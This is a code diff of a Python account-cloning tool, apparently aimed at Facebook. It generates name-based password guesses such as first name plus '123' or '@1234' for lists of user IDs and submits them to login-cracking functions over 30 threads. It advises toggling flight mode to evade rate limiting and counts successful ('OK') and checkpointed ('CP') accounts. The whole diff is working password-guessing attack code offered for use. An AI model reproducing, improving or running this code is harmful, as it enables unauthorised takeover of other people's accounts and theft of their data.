@@ -579,10 +579,8 @@ def crackfile():
 
 #-------------[ PENGATURAN-IDZ ]---------------#
  
+
 def setting():
-    # Make sure id2 and method are defined outside this function and accessible
-    # Also, ensure id is properly populated before calling this function
-    
     print('\033[0;97m-----------------------------------------------')
     print(" [\u001b[36m1\033[1;37m] ONLY OLD IDZ")
     print(" [\u001b[36m2\033[1;37m] ONLY NEW IDZ")
@@ -609,7 +607,6 @@ def setting():
         for bacot in id:
             xx = random.randint(0,len(id2))
             id2.insert(xx,bacot)
-    
     print('\033[0;97m-----------------------------------------------')
     print(" [\u001b[36m•\033[1;37m] LOGIN METHOD ")
     print('\033[0;97m-----------------------------------------------')
@@ -624,82 +621,81 @@ def setting():
         method.append('free')
     else:
         method.append('mobile')
-    
     print(' [\u001b[36m•\033[1;37m] DO YOU WANT TO SHOW CP IDZ? (Y/N) ')
     print('\033[0;97m-----------------------------------------------')       
     bau = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
-    
-    passwrd()  # Call passwrd function
-    exit()  # Exit the program
-
-# Define the passwrd function
+    passwrd()
+    exit() 
+ 
+#-------------------[ BAGIAN-WORDLIST ]------------#
+ 
 def passwrd():
     os.system('clear')
     print(logo)
     print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
-    print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m', str(len(id)))
+    print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m',str(len(id)))
     print('\033[0;97m-----------------------------------------------')
     print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE AFTER 5 MINUTES ')
     print('\033[0;97m-----------------------------------------------')
-    
     with tred(max_workers=30) as pool:
         for yuzong in id2:
-            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
-            pwv = []
+            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
             frs = nmf.split(' ')[0]
-            try:
-                lst = nmf.split(' ')[1]
-            except:
-                lst = ''
-                
-            if len(nmf) < 6:
-                if len(frs) < 3:
+            pwv = []
+            if len(nmf)<6:
+                if len(frs)<3:
                     pass
-                else:
+                else:                
+                    pwv.append(frs+'12')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs+'12345')
                     pwv.append(nmf)
-                    pwv.append(frs + lst)
-                    # other password combinations...
+                    pwv.append(frs+'@123')
+                    pwv.append(frs+'@1234')
+                    pwv.append(frs+'@12345')
+                    pwv.append(frs+'@@@')
+                    pwv.append(frs+'@#')
+                    pwv.append(frs+'123@')
+                                                
             else:
-                if len(frs) < 3:
+                if len(frs)<3:
                     pwv.append(nmf)
                 else:
+                    pwv.append(frs+'12')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs+'12345')
                     pwv.append(nmf)
-                    pwv.append(frs + lst)
-                    # other password combinations...
-
-            # Assuming pwpluss, pwnya, and method are defined outside this function
-            
+                    pwv.append(frs+'@123')
+                    pwv.append(frs+'@1234')
+                    pwv.append(frs+'@12345')
+                    pwv.append(frs+'@@@')
+                    pwv.append(frs+'@#')
+                    pwv.append(frs+'123@')
+                                        
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
-            else:
-                pass
-            
+            else:pass
             if 'mobile' in method:
-                pool.submit(crack, idf, pwv)
+                pool.submit(crack,idf,pwv)
             elif 'free' in method:
-                pool.submit(crackfree, idf, pwv)
+                pool.submit(crackfree,idf,pwv)
             elif 'touch' in method:
-                pool.submit(crackfree, idf, pwv)
+                pool.submit(crackfree,idf,pwv)
             elif 'mbasic' in method:
-                pool.submit(crackfree, idf, pwv)
+                pool.submit(crackfree,idf,pwv)
             else:
-                pool.submit(crackfree, idf, pwv)
-    
-    # Print cloning results
+                pool.submit(crackfree,idf,pwv)
     print('\033[0;91m-----------------------------------------------')
     print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
     print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
     print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
     print('\033[0;91m-----------------------------------------------')
-    
     woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
-    os.system("python TOXIC.py")
-    exit()
-
-# You need to define id2, method, logo, time, tag, ok, cp, pwpluss, pwnya, tred, and other functions used in the code.
-
-
+    os.system("python SUPRAJ.py")
+    exit() 
 
 #--------------------[ METODE-B-API ]-----------------#
 
